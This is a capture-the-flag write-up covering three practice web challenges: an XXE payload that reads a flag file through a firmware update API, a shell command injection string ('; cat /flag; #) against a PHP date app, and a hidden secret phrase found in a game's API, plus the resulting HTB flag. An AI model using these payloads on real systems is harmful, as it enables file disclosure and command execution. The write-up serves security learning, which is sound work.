# ğŸ›¡ï¸ CTF Challenge Write-Up: Real-World Web Exploits

**Author:** Raj Konkar  
**Date:** May 12, 2025

This write-up presents three web vulnerabilities I exploited during CTF practice sessions, simulating real-world scenarios: XML External Entity Injection (XXE), command injection, and a frontend logic flaw. Each challenge was approached with methodical testing and an emphasis on understanding both root cause and impact.

---

## ğŸ”“ Exploit 1: XML External Entity Injection (XXE) in Firmware Update API

**Vulnerability Type:** XML External Entity Injection (XXE)  
**Impact:** Arbitrary file disclosure from server  
**Target:** `/api/update` endpoint

### ğŸ” Reconnaissance & Discovery
By reviewing frontend JavaScript (`update.js`), I found that the app sends XML to `/api/update` using `Content-Type: application/xml`. This indicated the use of an XML parser, potentially misconfigured.

I used `curl` to manually send malformed XML and observed error messages referencing encoding and entity parsing â€” a common indicator of vulnerable parsers.

### ğŸ’¥ Exploit Payload
```xml
<!DOCTYPE FirmwareUpdateConfig [
  <!ELEMENT FirmwareUpdateConfig ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
```

### âœ… Result
The server response contained the full contents of `/flag.txt`, confirming a successful XXE-based file disclosure.

> **Why this worked:** The XML parser allowed external entity resolution and accessed a file without sanitization or restriction.

---

## ğŸ› ï¸ Exploit 2: Command Injection in PHP Time App

**Vulnerability Type:** OS Command Injection  
**Impact:** Remote command execution and file read  
**Target:** `format` parameter in `index.php`

### ğŸ” Reconnaissance & Discovery
During source analysis of a time-displaying app, I found that `TimeModel.php` passed unsanitized user input directly into a shell command via PHP `exec()`:

```php
$this->command = "date '+" . $format . "'";
```

The input was never validated or escaped, creating a direct command injection vector.

### ğŸ’¥ Exploit Payload
```bash
'; cat /flag; #
```

Encoded as:
```
%27%3Bcat%20/flag%3B%23
```

Final URL:
```
http://[target]/?format=%27%3Bcat%20/flag%3B%23
```

### âœ… Result
The app returned the contents of `/flag`, confirming successful command execution via injection.

> **Why this worked:** Shell metacharacters were directly injected, bypassing the intended `date` command logic.

---

## ğŸ® Exploit 3: Frontend Logic Flaw in Text-Based Game

**Vulnerability Type:** Frontend-hidden logic command  
**Impact:** Hidden win condition execution  
**Target:** Text adventure game API

### ğŸ” Reconnaissance & Discovery
While playing a browser-based command game, I opened DevTools and monitored calls to `/api/options`. This response contained an unused `"secret"` command string:

```json
"secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]
```

The game UI only accepted uppercase input, but the backend still accepted exact string matches regardless of case.

### ğŸ’¥ Exploit Execution
```
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

### âœ… Result
Entering the secret phrase triggered the hidden `/api/monitor` route, and the app displayed the flag:

```
HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_ab637978c1631b43cc6040d8a1e544ba}
```

> **Why this worked:** Hidden logic was client-controlled, and backend validation did not enforce UI constraints.

---

## ğŸ§  Key Takeaways

- XXE and command injection flaws often result from trusting user input without strict parsing rules or input validation.
- Reviewing JavaScript and browser traffic (via DevTools) can expose hidden logic or backend secrets.
- CTFs are an effective way to build intuition around real-world vulnerabilities and strengthen offensive security skills.

---

> ğŸ“Œ *More writeups, tools, and security scripts at:*  
> **[https://github.com/rajkonkar](https://github.com/rajkonkar)**

